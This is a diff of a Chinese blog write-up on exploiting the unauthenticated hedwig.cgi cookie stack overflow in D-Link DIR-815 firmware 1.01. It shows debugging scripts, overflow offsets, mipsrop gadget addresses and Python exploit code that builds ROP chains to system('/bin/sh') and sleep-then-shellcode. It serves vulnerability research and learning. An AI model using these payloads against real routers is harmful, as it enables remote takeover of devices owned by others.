@@ -10,7 +10,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="前言去年这个时候第一次分析这个漏洞，当时跟着0day那本书一步一步调试和分析，主要是从qemu用户模式进行分析调试结果写的exp没有getshell，时隔一年再次分析，这次增加了qemu系统模式分析,"> 
+    <meta name="description" content="[TOC]
+00-前言之前跟着《揭秘家用路由器0day漏洞挖掘技术》调试分析过该漏洞，主要是从qemu用户模式进行分析调试，因为太菜了并没有getshell，在参考了其他师傅的分析文章和帖子后，这次,"> 
     <meta name="author" content="青云"> 
     <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.jpg"> 
@@ -69,23 +70,33 @@
 
         </div>
         <div class="content markdown">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年这个时候第一次分析这个漏洞，当时跟着0day那本书一步一步调试和分析，主要是从qemu用户模式进行分析调试结果写的exp没有getshell，时隔一年再次分析，这次增加了qemu系统模式分析调试以及Firmadyne仿真测试这次可以终于getshell了，这次分析较上次有了更多收获。</p>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
+            <p>[TOC]</p>
+<h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00-前言"></a>00-前言</h1><p>之前跟着《揭秘家用路由器0day漏洞挖掘技术》调试分析过该漏洞，主要是从qemu用户模式进行分析调试，因为太菜了并没有getshell，在参考了其他师傅的分析文章和帖子后，这次分析增加了qemu系统模式调试,Firmadyne仿真测试以及实体机测试，虽然这次的用户模式还是没能getshell（发这个帖子还是希望有经验的师傅帮忙分析下问题所在），但是其他三种方式都能成功。</p>
+<h1 id="01-漏洞介绍"><a href="#01-漏洞介绍" class="headerlink" title="01-漏洞介绍"></a>01-漏洞介绍</h1><blockquote>
 <p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
 </blockquote>
-<p>D-Link官方安全公告：从漏洞公告中可以看出，该漏洞存在于名为”hedwig.cgi”的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个超长的Cookie值，使得程序栈溢出，从而获得路由器的远程控制权限。   </p>
-<p>具体详细内容可以在《揭秘家用路由器0day漏洞挖掘技术》一书中找到，接下来我们直接定位漏洞触发函数并进行一系列分析。</p>
-<h1 id="固件获取及漏洞定位"><a href="#固件获取及漏洞定位" class="headerlink" title="固件获取及漏洞定位"></a>固件获取及漏洞定位</h1><p>调试环境：ubuntu16.04 x64、IDA6.8、Ghidra、qemu2.5、firmadyne</p>
-<p>固件下载地址：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></p>
-<h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><p><code>binwalk -Me</code>解压 </p>
+<p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
+<h1 id="02-调试环境"><a href="#02-调试环境" class="headerlink" title="02-调试环境"></a>02-调试环境</h1><ul>
+<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
+<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
+<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
+<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
+<li>gdbserver：利用大佬已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
+<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
+<li>D-Link DIR-815 v1.01路由器实体机：用于测试分析结果</li>
+<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></li>
+</ul>
+<h1 id="03-漏洞定位"><a href="#03-漏洞定位" class="headerlink" title="03-漏洞定位"></a>03-漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
 <p><img src="binwalk.png" alt="">  </p>
-<h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
+<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
 <p><img src="find-name.png" alt=""></p>
-<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code></p>
-<p><img src="http_cookie.png" alt="">可以找到有一个函数，就是<code>sess_get_uid</code>，我之前有写<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析一下这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
-<p><img src="sess_get_uidref.png" alt="">)利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
+<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
+<p><img src="http_cookie.png" alt=""></p>
+<p>可以找到有一个<code>sess_get_uid</code>函数，这个<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析了这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
+<p><img src="sess_get_uidref.png" alt=""></p>
+<p>利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
 <p><img src="sprintf1.png" alt=""></p>
-<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，这一块按道理来说也可以导致栈溢出。而且如果可以执行该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容。</p>
+<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，如果可以执行到该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容，同样能够达到缓冲区溢出的目的。</p>
 <p><img src="sprintf2.png" alt=""></p>
 <p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
 <p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
@@ -94,8 +105,8 @@
 <p><img src="var-tmp2.png" alt=""></p>
 <p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是’w’，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
 <p><img src="fopen.png" alt=""></p>
-<p>所以漏洞点是第一个<code>sprintf</code>函数。其实有挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点，死活到不了第二个sprintf。</p>
-<h2 id="漏洞重新定位"><a href="#漏洞重新定位" class="headerlink" title="漏洞重新定位"></a>漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
+<p>所以漏洞点是第一个<code>sprintf</code>函数，挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点。其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造rop链方法都是一样的。但是对于真实设备而言，就要找到真正的漏洞点在哪。</p>
+<h2 id="3-1漏洞重新定位"><a href="#3-1漏洞重新定位" class="headerlink" title="3-1漏洞重新定位"></a>3-1漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
 <p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
 <pre class=" language-assembly"><code class="language-assembly">.text:00409AB0                 la      $t9, sobj_strdup
 .text:00409AB4                 lw      $a0, 4($s0)
@@ -116,19 +127,19 @@
 <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E4</span>                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
 <span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E8</span>                 b       loc_409A64
 <span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096EC                 addiu   $a1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aNoXmlData_ <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">"no xml data."</span></code></pre>
-<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建’/var/tmp’文件夹。</p>
-<h1 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。   </p>
+<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章(参考资料里面)还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建’/var/tmp’文件夹。</p>
+<h1 id="04-漏洞分析与利用"><a href="#04-漏洞分析与利用" class="headerlink" title="04-漏洞分析与利用"></a>04-漏洞分析与利用</h1><h2 id="4-1-漏洞分析"><a href="#4-1-漏洞分析" class="headerlink" title="4.1-漏洞分析"></a>4.1-漏洞分析</h2><p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。   </p>
 <p>cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:</p>
 <p>主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</p>
 <p>漏洞点sprintf函数</p>
 <p>sprintf(栈上的内容,”%s/%s/postxml”,”/runtime/session”,uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved ra达到控制程序流程的目的。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
+<h2 id="4-2-漏洞利用"><a href="#4-2-漏洞利用" class="headerlink" title="4.2-漏洞利用"></a>4.2-漏洞利用</h2><p>整个漏洞利用过程是</p>
 <ul>
 <li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
 <li>确定攻击路径，构造ROP链</li>
 <li>编写exp,getshell</li>
 </ul>
-<h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
+<h3 id="4-2-1-劫持PC，确定偏移"><a href="#4-2-1-劫持PC，确定偏移" class="headerlink" title="4.2.1-劫持PC，确定偏移"></a>4.2.1-劫持PC，确定偏移</h3><p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
 <p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
 <pre class=" language-sh"><code class="language-sh">#/bin/bash
 test=$(python -c "print 'uid='+open('test','r').read(2000)")
@@ -146,7 +157,7 @@ rm -f ./qemu</code></pre>
 <p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
 <p><img src="1043offset.png" alt=""></p>
 <p>以上是触发第一个sprintf()的偏移。</p>
-<h2 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h2><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
+<h4 id="4-2-1-1-重新确定偏移"><a href="#4-2-1-1-重新确定偏移" class="headerlink" title="4.2.1.1-重新确定偏移"></a>4.2.1.1-重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
 <pre class=" language-sh"><code class="language-sh">#!/bin/bash
 #sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`
 
@@ -166,8 +177,9 @@ rm -f ./qemu</code></pre>
 <p><img src="ra2.png" alt=""></p>
 <p><img src="%E5%81%8F%E7%A7%BB2.png" alt=""></p>
 <p>计算得到偏移为1009。</p>
-<h2 id="构造ROP链"><a href="#构造ROP链" class="headerlink" title="构造ROP链"></a>构造ROP链</h2><h3 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h3><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
-<h4 id="定位system函数地址"><a href="#定位system函数地址" class="headerlink" title="定位system函数地址"></a>定位system函数地址</h4><p>参考《0day》那本书，首先需要搜索system函数的地址，需要先找到libc.so，然后在libc.so中找到system函数。</p>
+<h3 id="4-2-2-选择攻击路径构造ROP链"><a href="#4-2-2-选择攻击路径构造ROP链" class="headerlink" title="4.2.2-选择攻击路径构造ROP链"></a>4.2.2-选择攻击路径构造ROP链</h3><h4 id="4-2-2-1-通过system函数getshell"><a href="#4-2-2-1-通过system函数getshell" class="headerlink" title="4.2.2.1-通过system函数getshell"></a>4.2.2.1-通过system函数getshell</h4><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
+<p>1.定位system函数地址</p>
+<p>首先需要先找到调用了哪个动态链接库libc.so，然后在libc.so中定位system函数。</p>
 <p>通过以下过程：</p>
 <pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
 set architecture mips
@@ -178,29 +190,28 @@ vmmap</code></pre>
 <p>为了以后不用每次都输入固定的指令可以编写一个dbgscript</p>
 <pre class=" language-sh"><code class="language-sh">set architecture mips
 set endian little
-file htdocs/cgibin
 target remote :23957
 b *0x409a54</code></pre>
-<p>gdb-multiarch调试的时候执行<code>gdb-multiarch -x dbgscript</code>，-x是指定要执行的命令文件。</p>
+<p>gdb-multiarch调试的时候执行<code>gdb-multiarch htdocs/cgibin -x dbgscript</code>，-x是指定要执行的命令文件。</p>
 <p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
 <p><img src="libc-so.png" alt=""></p>
-<p>找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
+<p>在/lib文件夹下找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
 <p><img src="system.png" alt=""></p>
 <p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
-<h4 id="绕过0构造rop链"><a href="#绕过0构造rop链" class="headerlink" title="绕过0构造rop链"></a>绕过0构造rop链</h4><p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。</p>
-<p>首先考虑将栈上地址放入寄存器中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找将堆栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，这样system函数的第一个参数就成功了。</p>
+<p>2.绕过坏字符\x00构造rop链</p>
+<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还到不了sprintf函数，前面的sess_get_uid函数只获取uid=之后\x00字符之前的字符串，进而导致缓冲区溢出失败。所以构造shellcode时需要对system函数的真实地址-1：0x7678b200-1=0x7678b1ff，再寻找gadget将其加1即可。</p>
+<p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
 <p><img src="gadget.png" alt=""></p>
 <p><img src="jalrs0.png" alt=""></p>
-<p>继续在libuClibc-0.9.30.1.so中寻找+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，将寄存器s0中的值加一。</p>
+<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
 <p><img src="addiu1.png" alt=""></p>
-<p>所以需要将system函数地址减一之后放入s0寄存器中，这个gadget之后是跳转到s1寄存器中的地址。</p>
-<p>由IDA中的反汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
+<p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
 <p><img src="%E8%A6%86%E7%9B%96.png" alt=""></p>
-<p>可以这样构造数据，payload大致如下：</p>
+<p>所以可以这样构造payload,结构大致如下：</p>
 <p><img src="%E6%9E%84%E9%80%A0.png" alt=""></p>
 <p>这里参考下H4lo师傅的整个流程图：</p>
 <p><img src="H4lo.png" alt=""></p>
-<p>对应的exp如下：</p>
+<p>3.构造的exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -228,7 +239,8 @@ padding <span class="token operator">+=</span> <span class="token string">'/bin/
 f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"exploit"</span><span class="token punctuation">,</span><span class="token string">'wb+'</span><span class="token punctuation">)</span>
 f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>padding<span class="token punctuation">)</span>
 f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p>执行命令：</p>
+<p>4.测试exp</p>
+<p>执行命令：</p>
 <pre class=" language-sh"><code class="language-sh">sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`</code></pre>
 <p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
 <p><img src="gadget1.png" alt=""></p>
@@ -236,35 +248,40 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p><img src="addius5sp10.png" alt=""></p>
 <p>进入system处，a0参数为/bin//sh。</p>
 <p><img src="libc_system.png" alt=""></p>
-<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，然后当前$fp的内容为0x0，(fp+0x10处)也无法访问，所以自然就报错了。空指针问题</p>
+<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，而当前$fp的内容为0x0空指针，(fp+0x10处)肯定无法访问。</p>
 <p><img src="libc_system2.png" alt=""></p>
 <p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
-<h3 id="调用sleep-1-函数"><a href="#调用sleep-1-函数" class="headerlink" title="调用sleep(1)函数"></a>调用sleep(1)函数</h3><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
+<h4 id="4-2-2-2-调用sleep-1-函数"><a href="#4-2-2-2-调用sleep-1-函数" class="headerlink" title="4.2.2.2-调用sleep(1)函数"></a>4.2.2.2-调用sleep(1)函数</h4><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
 <p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。 </p>
 <p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
 <p><img src="%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
-<h4 id="ROP-Gadget使用"><a href="#ROP-Gadget使用" class="headerlink" title="ROP Gadget使用"></a>ROP Gadget使用</h4><h5 id="ROP-Gadget-1"><a href="#ROP-Gadget-1" class="headerlink" title="ROP Gadget 1"></a>ROP Gadget 1</h5><p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50处，并且返回时跳转至s1寄存器中地址。</p>
+<p>1.ROP Gadget 1</p>
+<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
 <p><img src="lia0.png" alt=""></p>
 <p><img src="0x57E50.png" alt=""></p>
 <p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
-<h5 id="ROP-Gadget-2"><a href="#ROP-Gadget-2" class="headerlink" title="ROP Gadget 2"></a>ROP Gadget 2</h5><p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
+<p>2.ROP Gadget 2</p>
+<p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
 <p><img src="mipsrop-tail.png" alt=""></p>
 <p>选择0x3B8A8作为gadget2。</p>
 <p><img src="3B8A8.png" alt=""></p>
 <p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
 <p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
 <p><img src="libc_sleep.png" alt=""></p>
-<h5 id="ROP-Gadget-3"><a href="#ROP-Gadget-3" class="headerlink" title="ROP Gadget 3"></a>ROP Gadget 3</h5><p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
+<p>3.ROP Gadget 3</p>
+<p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
 <p><img src="mipsrop-stackfinders.png" alt=""></p>
-<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
+<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>，gadget3的作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
 <p><img src="14F28.png" alt=""></p>
 <p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
-<h5 id="ROP-Gadget-4"><a href="#ROP-Gadget-4" class="headerlink" title="ROP Gadget 4"></a>ROP Gadget 4</h5><p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
+<p>4.ROP Gadget 4</p>
+<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
 <p><img src="movet9s1.png" alt=""></p>
 <p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
 <p><img src="0x1DD08.png" alt=""></p>
-<p>到这里所有的gadget都找齐了，接下来开始构造exp。</p>
-<h5 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h5><p>整个payload是这样的：</p>
+<p>到这里所有的gadget都找齐了。</p>
+<p>5.构造exp</p>
+<p>整个payload是这样的：</p>
 <p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
 <pre class=" language-python"><code class="language-python">libc_base <span class="token operator">=</span> <span class="token number">0x76738000</span>
 sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span>
@@ -308,8 +325,8 @@ payload <span class="token operator">+=</span> shellcode</code></pre>
 <p>但是之后一直出不去，获取不到shell。</p>
 <p><img src="shellcode2.png" alt=""></p>
 <p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
